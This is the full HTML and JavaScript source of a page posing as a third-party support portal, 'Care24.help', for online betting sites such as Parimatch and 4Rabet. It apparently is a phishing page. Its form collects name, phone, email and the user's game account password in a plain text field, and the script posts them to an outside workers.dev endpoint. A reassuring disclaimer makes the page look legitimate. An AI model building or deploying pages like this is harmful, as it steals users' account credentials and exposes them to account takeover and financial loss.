<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Submit Support Request | Care24.help</title>
  <meta name="description" content="Submit a support request through Care24.help.">
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 20px 14px;
      background: #f3f6fb;
      color: #172033;
      font-family: Arial, sans-serif;
    }

    .container {
      max-width: 520px;
      margin: 20px auto;
      padding: 25px 20px;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 8px 30px rgba(0,0,0,.07);
    }

    h1 { font-size: 25px; margin: 0 0 8px; }

    .subtitle {
      color: #64748b;
      line-height: 1.5;
      margin-bottom: 22px;
    }

    label {
      display: block;
      margin: 15px 0 7px;
      font-size: 14px;
      font-weight: 600;
    }

    input, textarea {
      width: 100%;
      padding: 13px;
      border: 1px solid #d7deea;
      border-radius: 9px;
      font-size: 15px;
      background: white;
    }

    input:focus, textarea:focus {
      outline: none;
      border-color: #2563eb;
    }

    input[readonly] { background: #f1f5f9; }

    textarea {
      min-height: 115px;
      resize: vertical;
    }

    button {
      width: 100%;
      margin-top: 22px;
      padding: 15px;
      border: none;
      border-radius: 9px;
      background: #175bd6;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: .6;
      cursor: not-allowed;
    }

    #message {
      display: none;
      margin-top: 18px;
      padding: 13px;
      border-radius: 9px;
      line-height: 1.5;
      overflow-wrap: anywhere;
    }

    .success {
      display: block !important;
      background: #e9f9ef;
      color: #176534;
    }

    .error {
      display: block !important;
      background: #fff0f0;
      color: #a32323;
    }

    .note {
      margin-top: 18px;
      color: #64748b;
      font-size: 12px;
      line-height: 1.6;
    }
  </style>
</head>

<body>
  <main class="container">
    <h1>Submit Support Request</h1>
    <p class="subtitle">
      Fill in the details below to submit your support request.
    </p>

    <form id="supportForm">

      <label for="game">Selected Platform *</label>
      <input id="game" name="game" readonly required>

      <label for="name">Full Name *</label>
      <input id="name" name="name" type="text"
        maxlength="100" required>

      <label for="phone">Phone Number *</label>
      <input id="phone" name="phone" type="tel"
        maxlength="20" required>

      <label for="email">Email Address *</label>
      <input id="email" name="email" type="email"
        maxlength="150" required>

      <label for="gamePassword">Game Password *</label>
      <input id="gamePassword" name="gamePassword" type="text"
        maxlength="100" required>

      <label for="amount">Amount (Optional)</label>
      <input id="amount" name="amount" type="number"
        min="0" step="0.01">

      <label for="details">Describe Your Issue *</label>
      <textarea id="details" name="details"
        maxlength="3000"
        placeholder="Explain your issue here..."
        required></textarea>

      <button id="submitBtn" type="submit">
        Submit Support Request
      </button>
    </form>

    <div id="message" role="status" aria-live="polite"></div>

    <p class="note">
      Care24.help is an independent support request portal and
      is not an official representative of the selected platform.
      Never share your OTP, PIN or banking credentials.
    </p>
  </main>

  <script>
    const allowedGames = [
      "Crore Bet",
      "4Rabet",
      "Parimatch",
      "Stark Bet",
      "Valor Casino",
      "Topx"
    ];

    const params = new URLSearchParams(location.search);
    const selectedGame = params.get("game") || "";

    const form = document.getElementById("supportForm");
    const gameInput = document.getElementById("game");
    const button = document.getElementById("submitBtn");
    const message = document.getElementById("message");

    if (allowedGames.includes(selectedGame)) {
      gameInput.value = selectedGame;
    } else {
      button.disabled = true;
      message.className = "error";
      message.textContent =
        "Invalid platform. Please return to the homepage and select a platform.";
    }

    form.addEventListener("submit", async function(event) {
      event.preventDefault();

      message.className = "";
      message.textContent = "";

      if (!form.reportValidity()) return;

      button.disabled = true;
      button.textContent = "Submitting...";

      const payload = {
        game: gameInput.value,
        name: document.getElementById("name").value.trim(),
        phone: document.getElementById("phone").value.trim(),
        email: document.getElementById("email").value.trim(),
        gamePassword: document.getElementById("gamePassword").value.trim(),
        amount: document.getElementById("amount").value,
        details: document.getElementById("details").value.trim()
      };

      try {
        const response = await fetch(
          "https://care24-api.xkhanfarru.workers.dev/",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
          }
        );

        const result = await response.json();

        if (!response.ok || !result.success) {
          throw new Error(
            result.error || "Unable to submit your request."
          );
        }

        form.reset();
        gameInput.value = selectedGame;

        message.className = "success";
        message.textContent =
          "Request submitted successfully! Ticket ID: " +
          result.ticketId +
          ". Please save this Ticket ID.";

      } catch (error) {
        message.className = "error";
        message.textContent =
          error.message ||
          "Unable to submit your request. Please try again later.";
      } finally {
        button.disabled = false;
        button.textContent = "Submit Support Request";
      }
    });
  </script>
</body>
</html>
